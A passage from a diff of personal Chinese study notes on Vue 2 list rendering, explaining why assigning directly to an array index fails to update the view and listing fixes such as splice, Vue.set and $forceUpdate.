+						{id:'002',name:'周冬雨',age:31,sex:'女'},
+						{id:'003',name:'周杰伦',age:18,sex:'男'},
+						{id:'004',name:'温兆伦',age:19,sex:'男'}
+					]
+				},
+				methods: {
+					updateMei(){
+						// this.persons[0].name = '马老师' //奏效
+						// this.persons[0].age = 50 //奏效
+						// this.persons[0].sex = '男' //奏效
+						// this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
+						this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
+					}
+				}
+			}) 
+
+		</script>
+```
+
+上述代码中 `this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'}` 并没有生效
+
+解决方法
+
+[列表渲染 — Vue.js (vuejs.org)](https://v2.cn.vuejs.org/v2/guide/list.html#数组更新检测)
+
+在Vue.js中，当使用`v-for`指令渲染列表时，如果修改了列表数据但没有触发Vue的响应式更新，可能导致页面上的数据不会更新。这通常是由于Vue对响应式数据的检测机制导致的。
+解决这个问题的方法有以下几种：
+1. **数组变异方法**：
+   - 如果你使用的是数组来进行列表渲染，**确保使用Vue识别的数组变异方法来修改数组**，比如`push()`、`pop()`、`shift()`、`unshift()`、`splice()`、`sort()`、`reverse()`等。这样Vue会监听到数组的变化并更新视图。
+2. **对象属性新增**：
+   - 如果你使用的是对象来进行列表渲染，确保新增属性时使用`Vue.set(object, key, value)`或`this.$set(object, key, value)`方法来添加新属性。这样Vue会监听到对象的变化并更新视图。
+3. **响应式数据更新**：
+   - 确保修改数据时，使用Vue提供的响应式数据更新方法，比如`this.$set()`、`this.$delete()`等，而不是直接赋值。这样Vue能够正确地追踪数据的变化并更新视图。
+4. **强制更新**：
+   - 如果以上方法都无效，你可以尝试使用`this.$forceUpdate()`方法来强制更新组件。但这不是推荐的做法，因为Vue通常能够自动检测到数据的变化并更新视图。
+5. **使用计算属性**：
+   - 如果是对列表数据进行某种计算或过滤，可以考虑使用计算属性来处理数据，确保计算属性会随着依赖数据的变化而重新计算。
+   如果你遇到了在使用`v-for`渲染列表时修改数据不生效的问题，可以尝试以上方法来解决。通常情况下，遵循Vue的响应式数据更新规则，使用Vue提供的方法来修改数据，就能够保证页面正确地更新。
 
 
 
